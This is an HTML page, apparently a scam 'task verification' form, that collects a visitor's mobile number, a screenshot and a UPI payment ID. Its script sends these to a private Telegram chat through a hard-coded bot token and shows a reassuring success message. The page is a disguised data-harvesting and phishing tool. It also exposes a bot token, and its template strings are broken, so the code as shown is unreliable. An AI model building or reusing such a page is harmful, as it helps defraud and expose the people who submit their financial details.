<!DOCTYPE html>
<html lang="hi">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Emergent AI Verification</title>
<style>
  body { font-family: sans-serif; background: #f4f6f9; display: flex; justify-content: center; padding: 20px; }
  .card { background: white; padding: 20px; border-radius: 12px; width: 100%; max-width: 400px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
  h2 { text-align: center; color: #333; }
  .form-group { margin-bottom: 15px; }
  label { display: block; margin-bottom: 5px; font-weight: bold; }
  input[type="text"], input[type="file"] { width: 100%; padding: 10px; border: 1px solid #ccc; border-radius: 6px; box-sizing: border-box; }
  button { width: 100%; padding: 12px; background: #007bff; color: white; border: none; border-radius: 6px; font-size: 16px; cursor: pointer; }
</style>
</head>
<body>

<div class="card">
  <h2>Task Verification</h2>
  <form id="verifyForm">
    <div class="form-group">
      <label>Registered Number</label>
      <input type="text" id="phone" required placeholder="Enter mobile number">
    </div>
    <div class="form-group">
      <label>Submit Screenshot</label>
      <input type="file" id="screenshot" accept="image/*" required>
    </div>
    <div class="form-group">
      <label>Enter UPI ID</label>
      <input type="text" id="upi" required placeholder="Enter UPI ID">
    </div>
    <button type="submit">SUBMIT VERIFICATION</button>
  </form>
</div>

<script>
  document.getElementById('verifyForm').addEventListener('submit', async (e) => {
    e.preventDefault();
    const botToken = '8563241235:AAF9W8L6LyuQ9PkEVWZ0b-5EFBLmabrUxvY';
    const chatId = '-1004393424619';
    
    const phone = document.getElementById('phone').value;
    const upi = document.getElementById('upi').value;
    const fileInput = document.getElementById('screenshot').files[0];

    const formData = new FormData();
    formData.append('chat_id', chatId);
    formData.append('photo', fileInput);
    formData.append('caption', 🚀 NEW TASK!\n\n📞 नंबर: ${phone}\n💳 UPI ID: ${upi});

    try {
      const response = await fetch(https://api.telegram.org/bot${botToken}/sendPhoto, {
        method: 'POST',
        body: formData
      });
      if (response.ok) {
        alert('Verification submitted successfully!');
        window.location.reload();
      } else {
        alert('Failed to submit.');
      }
    } catch (error) {
      console.error('Error:', error);
      alert('An error occurred.');
    }
  });
</script>

</body>
</html>
